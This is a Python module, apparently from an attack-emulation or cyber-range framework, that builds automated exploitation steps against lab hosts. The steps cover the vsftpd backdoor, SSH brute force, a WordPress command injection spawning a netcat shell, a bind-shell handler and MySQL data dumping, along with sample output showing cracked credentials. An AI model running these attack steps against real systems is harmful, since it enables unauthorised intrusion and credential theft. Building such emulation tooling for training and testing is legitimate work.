import uuid
import re

from cyst_models.cryton.actions.action import Action, ExternalResources


class ExploitServer(Action):
    def __init__(
        self,
        message_id: int,
        caller_id: str,
        external_resources: ExternalResources,
        target: str,
        service: str,
        port: int = 4444
    ):
        self._service = service
        if service == "vsftpd":
            step_description = {
                "module": "metasploit",
                "arguments": {
                    "module_name": "unix/ftp/vsftpd_234_backdoor",
                    "datastore": {"payload": "cmd/unix/interact", "RHOSTS": target},
                }
            }
        elif service == "ssh":  # bruteforce
            step_description = {
                "module": "metasploit",
                "arguments": {
                    "module_name": "scanner/ssh/ssh_login",
                    "datastore": {"RHOSTS": target, "USERNAME": "user", "PASSWORD": "user"},
                }
            }
        elif service == "wordpress":
            step_description = {
                "module": "command",
                "arguments": {
                    "command": f"curl --max-time 5 http://{target}/?param=nc+-lvnp+{port}+-e+/bin/sh"
                }
            }
        elif service == "bind":
            step_description = {
                "module": "metasploit",
                "arguments": {
                    "module_name": "multi/handler",
                    "datastore": {"PAYLOAD": "payload/cmd/unix/bind_netcat", "RHOST": target, "LPORT": port},
                }
            }
        elif service == "mysql":
            step_description = {
                "module": "metasploit",
                "arguments": {
                    "commands": [
                        'pip install pymysql --break-system-packages',
                        fr'python3 -c "import pymysql; connection = pymysql.connect(host=\"{target}\",user=\"wordpress\",password=\"x\",database=\"wordpress\",port=3306,cursorclass=pymysql.cursors.DictCursor); print(connection.cursor().execute(\"SELECT * FROM wp_posts\"))"'
                    ]
                }
            }
        elif service == "samba":
            step_description = {
                "module": "metasploit",
                "arguments": {
                    "commands": [
                        fr'python3 -c "import socket; so=socket.socket(socket.AF_INET, socket.SOCK_STREAM); so.connect((\"{target}\", 445)); so.sendall(b\":)\")"'
                    ]
                }
            }
        else:
            raise RuntimeError(f"Unsupported service {service}.")

        template = {f"exploit-server-{message_id}-{uuid.uuid4()}": step_description}
        super().__init__(message_id, template, caller_id, external_resources)

    @property
    def processed_output(self):
        if self._service == "ssh":
            credentials: list[dict[str, str]] = list()
            for line in self.output.split("\n"):
                if line.startswith("[+]") and (x := re.search(r"Success: '(.+):(.+)' '", line)):
                    credentials.append({"username": x.groups()[0], "password": x.groups()[1]})
            return credentials

        return super().processed_output


# RHOSTS => 10.0.1.2
# PASSWORD => developer
# USERNAME => developer
# [*] 10.0.1.2:22 - Starting bruteforce
# [+] 10.0.1.2:22 - Success: 'developer:developer' 'uid=1001(developer) gid=1001(developer) groups=1001(developer),27(sudo) Linux developer 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64 GNU/Linux '
# [*] SSH session 5 opened (10.0.0.2-10.0.0.1:38766 -> 10.0.1.2:22) at 2024-06-17 11:57:04 +0000
# [*] Scanned 1 of 1 hosts (100% complete)
# [*] Auxiliary module execution completed
# 0ZWYIUzLB8b3lXicGocV

# {'session_id': 5, 'credentials': [{'username': 'developer', 'password': 'developer'}]}
